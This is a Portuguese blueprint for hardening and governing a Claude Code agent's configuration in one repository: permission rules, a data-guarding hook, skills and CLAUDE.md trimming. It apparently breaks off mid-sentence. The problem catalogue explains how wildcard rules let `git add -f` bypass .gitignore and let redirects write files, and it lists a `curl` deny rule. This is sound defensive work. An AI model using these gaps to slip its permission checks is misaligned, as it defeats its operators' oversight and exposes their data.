# Blueprint de governance e tooling do Claude Code — CronosComex

**Data:** 04/08/2026 · **Versão do Claude Code medida:** 2.1.220 (`claude --version`)
**Objeto projetado:** `.claude/` do projeto, `CLAUDE.md` da raiz e arquivos de
configuração do Claude Code na raiz.
**Nada foi aplicado.** Este documento é o único arquivo escrito. Nenhum arquivo
de configuração foi criado, editado ou removido; nenhum comando alterou o estado
do repositório (sem `git init`, sem `npm install`, sem execução da suíte).
**Caminhos negados pela configuração vigente** — `config/app.json` e `data/**` —
**não foram inspecionados por nenhuma via, inclusive shell.**

---

> ## ⚠ Adendo de execução — 05/08/2026
>
> **O cabeçalho acima deixou de valer.** As Ondas 0 e 1 foram executadas em
> 05/08/2026, em três commits (`86f931a`, `139f4db`, `4262de4`). O texto
> original do relatório está preservado; as correções vêm aqui, conforme a regra
> inviolável 1 do projeto.
>
> **Aplicado:** `git init -b main` sem remote · `.gitignore` +2 entradas ·
> `settings.json` reescrito (12 `allow` · 3 `ask` · 13 `deny` ·
> `disableBypassPermissionsMode`) · hook `PreToolUse` com 27 casos de regressão ·
> skills `/fatia` e `/fechar-historia` · `CLAUDE.md` de 261 → **239 linhas**.
> `npm run verify` passa: 20 arquivos, **279 testes**, build OK, sob Node
> `v22.23.2`.
>
> **Cinco afirmações deste relatório caíram na prática:**
>
> **1 · PR-01, causa errada.** Não é ausência de `nvm` (auditoria) nem apenas
> não-persistência entre chamadas (delegação). O Node v20.19.5 é **herdado do
> processo que lançou o VSCode**. Medido: a sessão do systemd não declara
> `NVM_BIN`, o `.zshrc` não força versão, o `default` do nvm já era `22.23.2`, e
> um login zsh com ambiente zerado escolhe `v22.23.2`. **A correção principal
> custa zero e não é configuração** — é relançar o editor de um terminal do
> sistema. `Bash(nvm use)` + 2 linhas no `CLAUDE.md` ficaram como seguro.
>
> **2 · PR-04 — RETIRADO. O erro era meu.** O bloco `## Estado` **não** divergia:
> ele diz 279 testes e o Vitest reporta **279**. Minha contagem estática por
> `grep` (273) é que não enxerga casos gerados em tempo de execução. O item sai
> do catálogo, e a peça 6 perde essa justificativa — mantém as outras.
>
> **3 · §10, `$ARGUMENTS` — resolvido.** **É** substituído antes de o comando
> `` !`…` `` executar. O plano B da §9.5 é desnecessário. **Armadilha nova, não
> prevista:** `$0` em corpo de skill vira o primeiro argumento, então `awk` com
> `$0` quebra — a extração usa `sed`. E a janela fixa `-A 95` do artefato
> original trazia **47 linhas da história seguinte**, o que é risco de correção,
> não só ruído: substituída por extração com limite de seção.
>
> **4 · §9.2, script do hook.** A versão da auditoria usa substring **sem
> âncora** e bloquearia `grep -n "git add" arquivo`. A versão aplicada quebra o
> comando nos separadores e ancora cada subcomando. Ela também nasceu com um
> falso positivo próprio — `2>/dev/null` num comando que mencionasse `.claude/`
> —, corrigido testando o **alvo** do redirecionamento em vez da linha inteira.
> O primeiro falso positivo apareceu em menos de dez minutos de uso real: a
> classificação de *"peça mais frágil, manutenção média"* se confirmou.
>
> **5 · G6, agora com número.** Dos 27 casos-limite das histórias concluídas, 15
> têm valor literal verificável e **15 de 15 estão cobertos**; 12 expressam o
> valor em prosa. Um verificador mecânico enxergaria 56% e erraria 1 em 15.
> **Veredito mantido: lacuna nomeada, sem peça** — agora por medição, não por
> julgamento. Mitigação de graça: `/fatia` lista os casos da história e
> `/fechar-historia` pergunta por eles.
>
> **Não aplicado, e por quê:** as três regras de `curl` em loopback (Onda 1) —
> `Bash(curl *)` ficou no `deny`, e `deny` vence `allow`; fechar a saída de rede
> valeu mais que economizar ~6 diálogos. Toda a Onda 2 segue com os gatilhos
> originais.

---

## 0. Divergência-mestra: dois diagnósticos do mesmo objeto já existem

O enunciado descreve o ponto de partida como *"não existe infraestrutura de
agentes"*. Isso é **verdadeiro sobre a configuração** e **falso sobre a
análise**. Medido por `find` na árvore:

| # | O enunciado diz | Medido | Consequência para este blueprint |
|---|---|---|---|
| **DIV-1** | Ponto de partida sem análise prévia | Existem **`docs/auditoria-configuracao-claude.md` (1.413 linhas)** e **`docs/delegacao-configuracao-claude.md` (1.025 linhas)**, ambos datados de 04/08/2026, ambos sobre `.claude/` e `CLAUDE.md`, ambos declarando que nada foi aplicado. O primeiro produziu 11 achados de segurança (A-01…A-11) e 7 decisões (D-1…D-7); o segundo, 7 lacunas de supervisão (LAC-1…LAC-7), 5 decisões (P-1…P-5) e artefatos escritos | **Não reabro nem reescrevo nada dos dois.** Onde há sobreposição, cito. O produto deste documento é o que **falta** nos dois: o eixo de mercado, o teste de transferibilidade, o modelo G1–G6, e **um único conjunto mínimo reconciliado** — porque hoje as duas recomendações incidem sobre o mesmo arquivo e **um leitor que siga só uma delas produz um `settings.json` errado** |
| **DIV-2** | *"Não há git inicializado nem `.gitignore`"* | Git: confirmado ausente (`git rev-parse` → `fatal: not a git repository`). **`.gitignore` existe**, 16 linhas, e cobre `*.xlsx`, `*.jpeg`, `data/`, `config/app.json`, `node_modules/`, `dist/`, com exceção `!tests/fixtures/*.xlsx` | O `.gitignore` está **bem escrito e hoje sem efeito algum**. Isso muda a Onda 0: `git init` não exige projetar um `.gitignore`, exige **duas linhas de acréscimo** (§9.3) |
| **DIV-3** | — | Os dois documentos anteriores **se contradizem** sobre `nvm`. A auditoria (§7b) afirma que *"`nvm` é função de shell e não existe como binário no shell não interativo do agente"*. O diagnóstico de delegação afirma o contrário | **Medi eu mesmo, nesta sessão** (§4, PR-01). O diagnóstico de delegação está certo: `type nvm` → `nvm`; `nvm use` → `v22.23.2`. E, em shell limpo, `node --experimental-strip-types -e "1"` → `node: bad option`. **A recomendação da auditoria de remover a linha `nvm use` do `CLAUDE.md` está errada e não entra neste blueprint** |
| **DIV-4** | — | A auditoria (§6) dá veredito **"Skills — NÃO ADOTAR"**; o diagnóstico de delegação propõe **duas skills** como movimentos 2 e 3 | **Não é contradição real, é diferença de função-objetivo** — resolvida em §5, MP-8. A auditoria pergunta *"esta skill fecha algum vetor de segurança?"* e responde corretamente que não. Este blueprint pergunta *"esta skill reduz custo de supervisão verificável?"*. **As duas skills entram**, sujeitas às restrições de segurança da auditoria |

---

## 1. Sumário — conjunto mínimo viável

Seis peças. Cada uma sobreviveu ao teste de minimalidade de §8.4: removida
mentalmente, algo concreto se perde.

| Ordem | Peça | Problema que resolve | Mecanismo | Onda |
|---|---|---|---|---|
| **1** | `git init` + 2 linhas no `.gitignore` | **PR-05** — nenhuma alteração de arquivo é reversível; não há como saber depois o que o agente mudou | Fora do Claude Code — **fundação de G3** | 0 |
| **2** | `.claude/settings.json` consolidado (auditoria §8.1 **+** `Bash(nvm use)`) | **PR-01** (Node errado), **PR-06** (perfilador pré-autorizado despeja credenciais), **PR-07** (`git add *` anula o `.gitignore`), **PR-08** (regras param de casar em outra máquina) | Regra de permissão — ramo **R6** | 0 |
| **3** | Hook `PreToolUse` `guard-dados-sensiveis.sh` | **PR-06**, **PR-07**, **PR-09** (redirecionamento escreve sob regra de aparência somente-leitura) | Hook — ramo **R1**: determinístico e obrigatório | 0 |
| **4** | Change-set do `CLAUDE.md` (3 fatos invariantes) | **PR-01**, **PR-05**, **PR-06** — o agente age errado por **não saber** que o Node precisa de prefixo, que não há desfazer, e que o repositório será publicado | `CLAUDE.md` — ramo **R5**, por exceção | 0 |
| **5** | Skill `/fatia` + remoção de 25 linhas do `CLAUDE.md` | **PR-02** — o contrato da história não sobrevive à compactação; `CLAUDE.md` a 261 linhas contra alvo de 200 | Skill — ramo **R2** | 1 |
| **6** | Skill `/fechar-historia` | **PR-03** — *definition of done* de 8 itens × 3 documentos, 20 repetições restantes, **1 falha medida em 12** | Skill — ramo **R3** | 1 |

**Saldo de contexto fixo: negativo** (≈ −20 linhas). Nenhuma peça aumenta o que
é carregado em toda sessão; a peça 5 reduz.

**Resultado desconfortável e honesto: nenhuma das seis peças é invenção deste
documento.** Todas as seis já estão especificadas em um dos dois diagnósticos
anteriores. O que este blueprint acrescenta é **sequenciamento, reconciliação e
o modelo de governance** — e a constatação de que a configuração correta para
este repositório é *menor* do que a soma das duas propostas existentes, não
maior. Ver a autoavaliação em §8.4.

---

## 2. Fontes

Todas as URLs de documentação consultadas em **04/08/2026**, a partir de
`https://code.claude.com/docs/pt/overview` e do índice `llms.txt` referenciado
no cabeçalho de cada página.

### 2.1 T1 — documentação e engenharia oficial do fornecedor

| URL | Data | O que sustenta |
|---|---|---|
| `code.claude.com/docs/pt/overview` | 04/08/2026 | Índice dos mecanismos; ponto de entrada obrigatório |
| `code.claude.com/docs/pt/memory` | 04/08/2026 | Localização e ordem de carregamento de `CLAUDE.md`; **alvo de < 200 linhas**; `.claude/rules/` com `paths:`; memória automática (`MEMORY.md`, 200 linhas / 25 KB); *"para bloquear uma ação independentemente do que Claude decidir, use um hook `PreToolUse`"* |
| `code.claude.com/docs/pt/skills` | 04/08/2026 | `.claude/skills/<nome>/SKILL.md`; **todos os campos de frontmatter são opcionais**, `description` recomendada; `disable-model-invocation`, `user-invocable`, `allowed-tools`, `argument-hint`, `context: fork`; nome do comando vem do **diretório**; teto de 1.536 caracteres em `description`+`when_to_use`; *"mantenha `SKILL.md` com menos de 500 linhas"*; **comandos personalizados foram mesclados em skills** |
| `code.claude.com/docs/pt/sub-agents` | 04/08/2026 | `.claude/agents/*.md`; **só `name` e `description` são obrigatórios**; opcionais `tools`, `disallowedTools`, `model`, `permissionMode`, `maxTurns`, `skills`, `mcpServers`, `hooks`, `memory`, `background`, `effort`, `isolation`, `color`, `initialPrompt`; contexto próprio, devolve só o resumo |
| `code.claude.com/docs/pt/hooks` | 04/08/2026 | Eventos (`PreToolUse`, `PostToolUse`, `SessionStart`, `Stop`, `ConfigChange`, `TaskCompleted`, …); formato em `settings.json` (`matcher`, `hooks[]`, `type`, `command`, `timeout`, `if`); **exit 0 = ok, 2 = bloqueio, outros = aviso não-bloqueante**; `${CLAUDE_PROJECT_DIR}` |
| `code.claude.com/docs/pt/permissions` | 04/08/2026 | Avaliação **deny → ask → allow**, primeira correspondência decide; separadores de comando composto; wrappers removidos; conjunto somente-leitura embutido; `Read` cobre `Edit` mas **não `Write`**; âncoras `/`, `//`, `~/`; *"padrões de permissão Bash que tentam restringir argumentos são frágeis"*; hook com exit 2 tem precedência sobre `allow` |
| `code.claude.com/docs/pt/settings` | 04/08/2026 | Precedência managed > CLI > local > project > user; `permissions`, `hooks`, `env`, `autoMemoryEnabled`, `disableAllHooks`, `sandbox` |
| `code.claude.com/docs/pt/features-overview` | 04/08/2026 | **Tabela oficial de escolha de mecanismo** e a tabela "construir sua configuração ao longo do tempo" (gatilho → o que adicionar). *"Coloque guardrails em hooks. Uma instrução como 'nunca edite `.env`' em CLAUDE.md ou uma skill é um pedido, não uma garantia"*; custo de contexto por recurso |
| `code.claude.com/docs/pt/context-window` | 04/08/2026 | *"Compaction replaces the conversation with a structured summary. System prompt, CLAUDE.md, memory, and MCP tools reload automatically. The skill listing is the one exception. **Only skills you actually invoked are preserved.**"* |
| `code.claude.com/docs/en/best-practices` (redirecionado de `anthropic.com/engineering/claude-code-best-practices`, HTTP 308) | 04/08/2026 | *"Give Claude a check it can run… Give Claude something that produces a pass or fail, and the loop closes on its own"*; *"Keep it concise. For each line, ask: 'Would removing this cause Claude to make mistakes?' If not, cut it. **Bloated CLAUDE.md files cause Claude to ignore your actual instructions!**"*; *"Unlike CLAUDE.md instructions which are advisory, **hooks are deterministic and guarantee the action happens**"*; *"**Checkpoints only track changes made through Claude's file editing tools.** Changes made through Bash commands or external processes are not captured. **This isn't a replacement for git.**"*; *"Add an adversarial review step"*; *"Check CLAUDE.md into git so your team can contribute"* |
| `anthropic.com/engineering/effective-harnesses-for-long-running-agents` | 04/08/2026 | *"The best way to elicit good behavior was to ask the model to commit its progress to git with descriptive commit messages and to write summaries of its progress in a progress file"* |
| `claude.com/blog/how-anthropic-teams-use-claude-code` | 04/08/2026 | Uso por times internos identificados (Security Engineering, Data Infrastructure) — **consultada apenas por resumo de busca, não lida integralmente**; ver §10. Nenhuma recomendação deste blueprint repousa sobre ela |

### 2.2 T2 — relato de engenharia de organização identificável

| URL | Organização / autor | Data | O que sustenta |
|---|---|---|---|
| `sanity.io/blog/first-attempt-will-be-95-garbage` | **Sanity** · Vincent Quigley, Software Engineering Manager | 02/09/2025 | Jornada de 6 semanas com contexto de aplicação e falhas nomeadas: `CLAUDE.md` por projeto contendo *"architecture decisions, common patterns, gotchas and workarounds"*; **falsa confiança** (código quebrado com afirmação de qualidade) como modo de falha dominante; revisão em três etapas (Claude → engenheiro → time); processo de três tentativas (95% lixo → 50% → viável) |
| `huggingface.co/blog/sionic-ai/claude-code-skills-training` | **Sionic AI** · Sigrid Jin | 08/12/2025 | Registro de skills versionado; **duas** skills operacionais (`/advise`, `/retrospective`); `CLAUDE.md` como camada fina de comportamento e o conhecimento nas skills; *"the cultural part is harder than the technical part"* — o sucesso dependeu de tornar `/retrospective` tão barato que *"costs more effort to skip it than to do it"* |
| `newsletter.pragmaticengineer.com/p/how-claude-code-is-built` | **The Pragmatic Engineer** · Gergely Orosz (reportagem sobre o time do Claude Code) | 23/09/2025 | Fluxo centrado em PR: ~5 PRs/dia por engenheiro, 60–100 releases internos/dia; time de ~10 engenheiros; *"delete a bunch of code"* a cada modelo novo — corrobora poda como hábito, não como evento |

### 2.3 T3 — repositório aberto com adoção verificável

| URL | Organização | Verificação | O que sustenta |
|---|---|---|---|
| `github.com/aws-samples/sample-claude-code-agent-team` | **AWS Samples** | 36 commits; versiona de fato `.claude/settings.json`, `agents/`, `skills/`, `hooks/` | **Hooks impondo protocolo por máquina**: `TaskCreated` exige formato; **`TaskCompleted` bloqueia a conclusão sem execução de um comando `Run:` e uma sentinela provando que passou**; `TeammateIdle` cutuca. Decisões logadas em `~/.claude/logs/team-hooks.jsonl`. Hooks deliberadamente **fail-open** para que bugs nunca bloqueiem |
| `github.com/ROCm/repo-digest` | **ROCm** (AMD) | 62 commits; versiona `.claude/agents/` (`digest.md`, `analyze-commit.md`), `.claude/skills/`, `.claude/projects/` | Subagent orquestrador + subagent analisador em paralelo, justificado por **volume de leitura**, não por preferência; configuração de agente tratada como código versionado |

### 2.4 Quórum

Regra aplicada: consenso de mercado exige **duas fontes independentes** T1–T3.
Duas páginas do mesmo fornecedor **não são independentes entre si**.

| Prática (§5) | Fontes | Quórum |
|---|---|---|
| MP-1 · Laço de verificação que o agente roda sozinho | T1 best-practices + **T2** Sanity + **T3** AWS | ✅ |
| MP-2 · `CLAUDE.md` enxuto; procedimento vai para skill | T1 best-practices/memory/features-overview + **T2** Sionic AI | ✅ |
| MP-3 · Hook para o que precisa ser determinístico | T1 features-overview/best-practices + **T3** AWS | ✅ |
| MP-4 · Review adversarial em contexto fresco | T1 best-practices + **T2** Sanity + **T3** AWS | ✅ |
| MP-5 · Git como rede de segurança; checkpoint não substitui | **Só T1** (best-practices + effective-harnesses, mesmo fornecedor) | ❌ — apresentada como **orientação do fornecedor**, não como consenso |
| MP-6 · Allowlist estreita em vez de modo amplo | **Só T1** (permissions + best-practices) | ❌ — **orientação do fornecedor** |
| MP-7 · Versionar a configuração do agente | T1 best-practices + **T3** AWS + **T3** ROCm | ✅ |
| MP-8 · Skill para procedimento repetido; efeito colateral só por invocação manual | T1 skills/best-practices + **T2** Sionic AI + **T3** ROCm | ✅ |
| MP-9 · Paralelizar com agent teams / fan-out | T1 best-practices | (descartada por transferibilidade, não por quórum) |
| MP-10 · Separar exploração de implementação | T1 best-practices + **T2** Sanity | ✅ |

**Descartadas na triagem, e por quê.** `digitalapplied.com` (estudo de caso com
cliente **não identificado** — "uma organização de trinta engenheiros" — em peça
de marketing de consultoria): falha o requisito de organização identificável.
`smartscope.blog`, `marktechpost.com`, `developersdigest.tech`, `firecrawl.dev`,
`mcp.directory`, `codingscape.com`, `roboticforce.io`: listas de dicas sem
contexto de aplicação → T4, servem só como pista. `morphllm.com`,
`codersera.com`, `thepromptshelf.dev`, `pub.towardsai.net` (comparativos
AGENTS.md × CLAUDE.md): T4. **Consequência registrada:** a prática "adote
AGENTS.md como fonte compartilhada e CLAUDE.md como camada fina" **não tem
nenhuma fonte T1–T3** e por isso **não entra neste relatório** — nem para adotar,
nem para descartar com fundamento de mercado (ver §8.5).

**Recência.** As três fontes T2 são de setembro e dezembro de 2025, entre 8 e 11
meses anteriores à documentação vigente. Confrontadas com o Passo 0: **nenhuma
contradiz a documentação atual**. Uma imprecisão de nomenclatura registrada — a
Sionic AI descreve `/advise` e `/retrospective` como *"commands"*; a
documentação de 04/08/2026 declara que *"comandos personalizados foram mesclados
em skills"* e que ambos os formatos criam o mesmo `/nome`. O mecanismo mudou de
nome, a prática permanece válida.

---

## 3. Estado atual — inventário

### 3.1 `.claude/`

```
.claude/
└── settings.json     844 bytes · 30 linhas · mtime 03/08/2026 15:45
```

Não existem `agents/`, `skills/`, `commands/`, `hooks/`, `rules/`,
`settings.local.json`, `.mcp.json`, `CLAUDE.local.md`, nem `CLAUDE.md` em
subdiretório. Verificado por `find` sobre a árvore.

Conteúdo integral: **19 entradas em `allow`, 2 em `deny`, nada mais.** Sem
`ask`, sem `defaultMode`, sem `hooks`, sem `sandbox`.

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "permissions": {
    "allow": [
      "Bash(npm run verify)", "Bash(npm test)", "Bash(npm test -- *)",
      "Bash(npm run lint)", "Bash(npm run typecheck)", "Bash(npm run build)",
      "Bash(npm run dev)", "Bash(npm ci)", "Bash(npm install)",
      "Bash(npx vitest *)", "Bash(npx tsc *)", "Bash(node --version)",
      "Bash(python3 tools/profile_workbook.py *)", "Bash(unzip -l *)",
      "Bash(git status)", "Bash(git diff *)", "Bash(git log *)", "Bash(git add *)",
      "Read(//home/usuario/Desktop/CronosComex/**)"
    ],
    "deny": [
      "Read(//home/usuario/Desktop/CronosComex/config/app.json)",
      "Read(//home/usuario/Desktop/CronosComex/data/**)"
    ]
  }
}
```

O veredito entrada a entrada já existe em `docs/auditoria-configuracao-claude.md`
§5 e **não é repetido aqui**.

### 3.2 Scripts e ferramentas de qualidade (insumo)

**Existe comando único de verificação: `npm run verify`** = `lint && typecheck
&& test && build`, e está autorizado por casamento exato. Duas ressalvas
medidas:

- **Roda na versão errada de Node se ninguém prefixar `nvm use &&`** — e o
  comando prefixado **pede permissão**, porque cada subcomando de um comando
  composto precisa casar uma regra própria e `nvm use` não casa nenhuma
  (PR-01).
- **A saída de falha é acionável por um agente** — Biome, `tsc` e Vitest emitem
  `arquivo:linha` e regra. **Inferido da configuração das três ferramentas; a
  suíte não foi executada** (executá-la escreve em `dist/` e plausivelmente em
  `data/`, o que alteraria o estado do repositório).

`npm run lint:fix` (`biome check --write .`) **não casa nenhuma regra**.
`build_fixtures.py`, que **sanitiza**, não está autorizado;
`profile_workbook.py`, que **não sanitiza**, está.

**A fronteira de `src/domain/` é imposta pela ferramenta**, não por instrução:
`biome.json` tem override em `src/domain/**` com `noRestrictedImports` sobre
`**/io/**`, `**/app/**`, `**/http/**`, `**/web/**`, `node:fs`, `node:path`,
`fastify`, `exceljs`, `fflate`, `chokidar`, nível `error`, mensagem citando o
ADR. **É o modelo a imitar** — ver G2.

`vitest.config.ts`: `coverage.thresholds` = `{ lines: 0, functions: 0,
branches: 0, statements: 0 }`, com comentário declarando que RNF-35 exige
domínio ≥ 90% e RNF-36 exige io ≥ 80%. **Nenhum limiar está ativo.**

### 3.3 `CLAUDE.md`

**261 linhas / 13.622 bytes** — contra o alvo documentado de **< 200 linhas**
(`/docs/pt/memory`, 04/08/2026). Blocos: ordem de leitura · 10 regras
invioláveis · stack fixada · estrutura · fatos medidos · **`## Estado` (~75
linhas, único bloco que cresce monotonicamente)** · comandos · **protocolo de
fatia (46 linhas, das quais 25 são gabarito markdown puro)** · marcos de tooling
· convenções.

### 3.4 `docs/` e artefatos de procedimento (insumo)

23 arquivos, **16.636 linhas** de markdown. A densidade normativa é o fato
relevante deste inventário: **especificação densa de negócio é fonte de problema
recorrente**, e aqui ela existe em escala.

| Arquivo | Linhas | O que exige de quem implementar |
|---|---|---|
| `06-backlog.md` | 1.952 | **32 histórias**, cada uma com contrato fixado, critérios de aceite e casos-limite |
| `auditoria-configuracao-claude.md` | 1.413 | 11 achados de segurança de configuração, nenhum aplicado |
| `delegacao-configuracao-claude.md` | 1.025 | 7 lacunas de supervisão, nenhuma aplicada |
| `05-contratos-api.md` | 557 | Schemas de rota |
| `03-modelo-dados.md` | 502 | Tabelas de decisão TD-01…TD-06 e TD-05.1 |
| `07-plano-entrega.md` | 390 | 5 fases; **caminho crítico de 18 sessões sequenciais** |
| `08-qualidade-operacao.md` | 334 | §1.3: **43 casos-limite obrigatórios**, com valor concreto e história atribuída |
| `09-rastreabilidade.md` | 243 | Matriz indicador/alerta → história → teste → status |
| `10-governanca.md` | 178 | **Definition of done** de história: 8 itens |

### 3.5 Estado do versionamento e o que hoje é rastreável

Sem `.git`. **Nada do que o agente altera é rastreável depois.** O que existe:

| Artefato | Rastreia o quê | Limite |
|---|---|---|
| `data/logs/app-<AAAAMMDD>.jsonl` | Execução da **aplicação** | Não rastreia o agente. Caminho negado — não inspecionado |
| Transcrições de sessão em `~/.claude/projects/…` | Conversa e chamadas de ferramenta | Fora do repositório, local da máquina, não revisável como diff |
| Checkpoints de sessão (`/rewind`) | Alterações pelas **ferramentas de edição** | *"Changes made through Bash commands or external processes are not captured. This isn't a replacement for git."* (T1) |
| Blocos `> ✅ **CONCLUÍDA em …**` no backlog | Histórias fechadas | Manual — e **já falhou 1 vez em 12** (PR-03) |

### 3.6 Ambiente, medido nesta sessão

```
$ node --version                                  → v20.19.5
$ node --experimental-strip-types -e "1"          → node: bad option
$ type nvm                                        → nvm
$ nvm use >/dev/null && node --version            → v22.23.2
$ claude --version                                → 2.1.220 (Claude Code)
$ git rev-parse --is-inside-work-tree             → fatal: not a git repository
```

`package.json` declara `"engines": { "node": ">=22.12.0 <23" }`.

---

## 4. Catálogo de problemas reais

Nenhuma peça do blueprint existe sem apontar para uma linha desta tabela.
**Frequência** traz o método da estimativa. **[obs]** = observado nesta sessão;
**[inf]** = inferido, com base declarada; **[obs-2ª]** = medido por um dos dois
diagnósticos anteriores e **não re-medido** por mim.

| # | Problema | Evidência | Obs/Inf | Frequência (base) | Custo |
|---|---|---|---|---|---|
| **PR-01** | O comando prescrito para rodar Node **pede permissão**; o que não pede **roda na versão errada e falha com erro que não parece de ambiente** | Medido por mim: `node --version` → `v20.19.5`; `node --experimental-strip-types -e "1"` → `node: bad option`; `nvm use` → `v22.23.2`. `package.json` exige `>=22.12.0`. `nvm use` não casa nenhuma das 19 regras nem o conjunto somente-leitura embutido | **[obs]** | ≥ 20 — uma por história restante (32 no backlog, 12 fechadas), no mínimo uma execução do portão por história | 1 diálogo por chamada **+** uma classe inteira de diagnóstico errado: `npm run dev` e `npm start` falham e o sintoma aponta para código |
| **PR-02** | **O contrato da história não sobrevive à compactação.** Ele chega ao contexto como saída de `Read`, que é resumida; e o procedimento que o exige custa 46 linhas em **toda** sessão, inclusive nas que não abrem história | T1 `context-window`: *"Only skills you actually invoked are preserved"* — saídas de `Read`/`Grep`/`Bash` são resumidas. `CLAUDE.md` medido em **261 linhas** contra alvo de 200, das quais **25 são gabarito markdown puro**. Caminho crítico de **18 sessões** (`07-plano-entrega.md`) | **[obs]** quanto ao mecanismo e ao tamanho; **[inf]** quanto ao erro dele decorrente — não observei implementação contra assinatura lembrada | 20 aberturas de história | Implementar contra a assinatura lembrada em vez da fixada; e custo fixo de contexto em ~18 sessões, a maioria das quais não abre história |
| **PR-03** | A *definition of done* é conferida à mão: **8 itens × 3 documentos**, e **já escapou** | `10-governanca.md:79-86` (8 itens). Medido por mim: `awk '/^### H-/{h=$2} /^> ✅/{print h}' docs/06-backlog.md` devolve `H-01 H-02 H-03 H-04 H-05 H-07 H-08 H-09 H-10 H-11 H-31` — **`H-06` não aparece**, embora conste como concluída na tabela-resumo e em `09-rastreabilidade.md` | **[obs]** | 12 execuções feitas, **20 restantes** | Conferência manual em 3 documentos, 20 vezes. **Taxa de falha medida: 1 em 12** |
| **PR-04** | O `## Estado` do `CLAUDE.md` é um espelho manual de estado medido, **e já está divergente** | Medido por mim: `grep -rhoE "\b(it\|test)\(" tests --include='*.test.ts' \| wc -l` → **273**. `CLAUDE.md` afirma **279**. Diferença de 6 | **[obs]** quanto à divergência; **[inf]** quanto à causa — provavelmente casos gerados por laço ou `describe` aninhado; não executei a suíte | A cada fechamento de história | Número transcrito de memória em vez de lido da ferramenta. Sozinho é barato; é sintoma de PR-03 |
| **PR-05** | **Nenhuma alteração de arquivo é reversível, e não há como saber depois o que o agente mudou** | `git rev-parse` → `fatal: not a git repository` **[obs]**. `.gitignore` existe e está sem efeito **[obs]**. T1: checkpoints não cobrem escrita por Bash/subprocesso e *"isn't a replacement for git"*. `deny Read` não cobre `Write` (T1 `permissions`) | **[obs]** | Contínuo | **Bloqueia G3 inteiro** (rastreabilidade), G4 (revisão sem diff), a permissão de `lint:fix`, e qualquer execução sem usuário presente. Uma sobrescrita errada é permanente |
| **PR-06** | O perfilador **pré-autorizado** emite amostras de célula de **todas as abas**, inclusive `CNPJ`, para caminho livre — e o `CLAUDE.md` manda executá-lo | `settings.json:17` = `Bash(python3 tools/profile_workbook.py *)`. Auditoria anterior cita `profile_workbook.py:106` (laço sem filtro de aba), `:200` (15 amostras/coluna), `:252` (destino no `argv[2]`, sem restrição). `CLAUDE.md` manda executar em dois pontos | **[obs-2ª]** — não reexecutei o perfilador nem li a planilha | 1× por virada de ano (gatilho: aparecer a aba `2027`) | **Contradiz diretamente a regra inviolável 10 do `CLAUDE.md`.** A permissão vence a instrução: T1 — *"as regras de permissão são aplicadas pelo Claude Code, não pelo modelo"* |
| **PR-07** | `Bash(git add *)` **anula o `.gitignore`**, e nenhuma regra `deny` de `Read` o alcança | `settings.json:22`. T1 `permissions`: regras deny de `Read`/`Edit` *"não se aplicam a subprocessos arbitrários que leem ou escrevem arquivos indiretamente"*. `git add -f` casa `Bash(git add *)`, porque `*` abrange espaços | **[obs]** quanto à regra e à semântica documentada | Hoje o comando falha (sem `.git`); **passa a valer no minuto seguinte ao `git init`** | Publicação irreversível da planilha real e das credenciais. É o problema que **transforma a Onda 0 numa unidade indivisível**: `git init` sem esta correção é pior que o estado atual |
| **PR-08** | As três regras com caminho absoluto **deixam de casar em qualquer outra máquina, em silêncio** | `settings.json:23,26,27` usam `//home/usuario/Desktop/CronosComex/…`. `H-30`/PD-01 planejam a migração para máquina Windows | **[obs]** quanto às regras; **[inf]** quanto ao não-casamento no Windows, apoiado na normalização POSIX documentada | Certeza — `H-30` está no backlog | As duas únicas proteções somem sem aviso. **A ausência de um prompt é indistinguível de uma regra funcionando** |
| **PR-09** | Sete regras terminam em curinga; o curinga final **não delimita redirecionamento** | `Bash(npm test -- *)`, `Bash(npx vitest *)`, `Bash(npx tsc *)`, `Bash(git diff *)`, `Bash(git log *)`, `Bash(git add *)`, `Bash(python3 … *)`. T1 `permissions` lista os separadores reconhecidos (`&&`, `\|\|`, `;`, `\|`, `\|&`, `&`, quebra de linha) e **não inclui `>`**. `git diff --output=<arquivo>` escreve e casa `Bash(git diff *)` | **[inf]** — a doc lista os separadores mas não afirma o tratamento de `>`; teste empírico registrado em §10 | Exige erro ou injeção; não é rotina | Escrita em caminho arbitrário sob regra de aparência somente-leitura. Sem git, irreversível |
| **PR-10** | **Não existe verificação mecânica de que os 43 casos-limite obrigatórios viraram teste** | `08-qualidade-operacao.md` §1.3 tem coluna "História", mas nada filtra por história. Medido por mim: `vitest.config.ts` tem `thresholds` **zerados** nos quatro eixos, com comentário declarando que RNF-35/36 exigem 90%/80% | **[obs]** | 20 histórias restantes | Cobrir menos casos do que a tabela exige, sem que nada reprove. **Fica como lacuna nomeada em G5 — não gera peça** (ver §8.5) |

---

## 5. Práticas de mercado e transferibilidade

Quatro etapas por prática, por escrito. Prática sem este teste é cargo cult e
não entra.

### MP-1 · Dar ao agente um teste que ele mesmo roda — quórum ✅

1. **Origem:** times internos da Anthropic (T1); Sanity, ~1 engenheiro sênior
   com time atrás (T2); AWS Samples, repositório de exemplo multi-agente (T3).
2. **Premissa:** existe uma verificação automatizável que devolve passa/falha e
   cuja saída de falha é legível pelo agente.
3. **Vale aqui?** **Sim, e é o ponto mais forte do repositório.** `npm run
   verify` existe, é único, e está autorizado por casamento exato. **Mas roda na
   versão errada de Node** (PR-01) — a premissa está satisfeita *e sabotada*.
4. **Veredito: ADOTAR COM ADAPTAÇÃO.** A adaptação é PR-01: `Bash(nvm use)` no
   `allow` e uma linha no `CLAUDE.md` explicando que o shell reinicia a cada
   chamada. **Perde-se:** nada. → peças 2 e 4.
   *Nuance transferida da T3 (AWS):* eles fecham o laço com um hook
   `TaskCompleted` que **bloqueia a conclusão sem prova de execução**. Avaliado
   e **cortado** aqui — ver §8.5, hook `Stop`/`TaskCompleted`.

### MP-2 · `CLAUDE.md` enxuto; procedimento vai para skill — quórum ✅

1. **Origem:** Anthropic (T1); Sionic AI, organização de pesquisa em ML com
   registro de skills versionado (T2).
2. **Premissa:** o `CLAUDE.md` cresceu ao ponto de degradar aderência **e**
   existe conteúdo procedimental que só se aplica às vezes.
3. **Vale aqui?** **Sim, medido:** 261 linhas contra alvo de 200; 46 linhas de
   procedimento condicional; 75 linhas de um bloco que cresce a cada história.
4. **Veredito: ADAPTAR.** Mover **só as 25 linhas do gabarito**, não as 5 regras
   do protocolo nem o bloco `## Estado`. **Perde-se:** o gabarito deixa de
   carregar incondicionalmente — mitigado mantendo a frase de gatilho no
   `CLAUDE.md`, que é o que garante a invocação. → peça 5.
   *A alternativa `docs/gabarito-fatia.md`* (proposta da auditoria) foi
